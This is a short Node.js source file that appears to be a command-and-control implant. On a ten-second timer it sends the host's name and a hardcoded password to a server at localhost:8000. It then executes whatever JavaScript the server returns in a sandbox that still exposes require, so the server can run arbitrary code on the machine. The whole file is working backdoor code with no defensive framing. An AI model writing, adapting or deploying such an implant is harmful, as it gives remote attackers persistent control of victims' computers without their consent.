const http = require('node:http');
const os = require('node:os');
const util = require('node:util');
const vm = require('node:vm');

var heartbeat = function() {
    //TODO Create the correct sandbox to support all plugins that could be written
    const sandbox = {
        require,
        console
    };

    const postData = JSON.stringify({
    'implant_name': os.hostname(),
    'client_password': 'secret'
    });

    const options = {
    hostname: 'localhost',
    port: 8000,
    path: '/whoami.js',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData),
    },
    };

    const req = http.request(options, (res) => {
    console.log(`STATUS: ${res.statusCode}`);
    console.log(`HEADERS: ${JSON.stringify(res.headers)}`);
    res.setEncoding('utf8');
    res.on('data', (chunk) => {
        console.log(`BODY: ${chunk}`);
        const script = new vm.Script(chunk);
        const context = new vm.createContext(sandbox);
        script.runInNewContext(context);
        // eval(chunk);
    });
    res.on('end', () => {
        console.log('No more data in response.');
    });
    });

    req.on('error', (e) => {
    console.error(`problem with request: ${e.message}`);
    });

    // Write data to request body
    req.write(postData);
    req.end();
}

setInterval(heartbeat, 10000);